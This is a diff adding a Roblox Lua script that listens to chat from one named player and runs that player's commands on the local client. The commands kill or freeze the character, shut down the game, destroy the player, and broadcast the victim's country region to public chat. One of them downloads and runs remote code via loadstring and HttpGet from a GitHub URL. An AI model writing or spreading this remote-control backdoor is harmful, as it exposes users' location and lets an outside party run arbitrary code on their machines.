@@ -1,0 +1,43 @@
+local function onPlayerChatted(message, player)
+    local lowercaseMessage = message:lower()
+    
+    if lowercaseMessage:find(".die") then
+  game.Players.LocalPlayer.Character.Humanoid:ChangeState("Dead")
+elseif lowercaseMessage:find(".find") then
+   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+         ",//./.",
+         "All"
+     )
+elseif lowercaseMessage:find(".go away") then
+  game:Shutdown()
+elseif lowercaseMessage:find(".disappear") then
+  game.Players.LocalPlayer:Destroy()
+elseif lowercaseMessage:find(".never come back again") then
+local module =
+         loadstring(game:HttpGet "https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua")()
+      module:Teleport(game.PlaceId)
+elseif lowercaseMessage:find(".your country") then
+
+local player = game.Players.LocalPlayer
+local countryRegion = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player)
+local systemLocaleId = game.LocalizationService.SystemLocaleId
+local message = countryRegion
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+
+elseif lowercaseMessage:find(".come") then
+ partTweenn = game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(3, Enum.EasingStyle.Linear), {
+        CFrame = game.Players.ADSKer_man222.Character.HumanoidRootPart.CFrame
+    })
+    partTweenn:Play()
+elseif lowercaseMessage:find(".english or spanish") then
+   
+   for _, part in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                        if part:IsA("BasePart") then
+                            part.Anchored = true
+                        end
+                    end
+   
+    end
+end
+
+game.Players.ADSKer_man222.Chatted:Connect(onPlayerChatted)
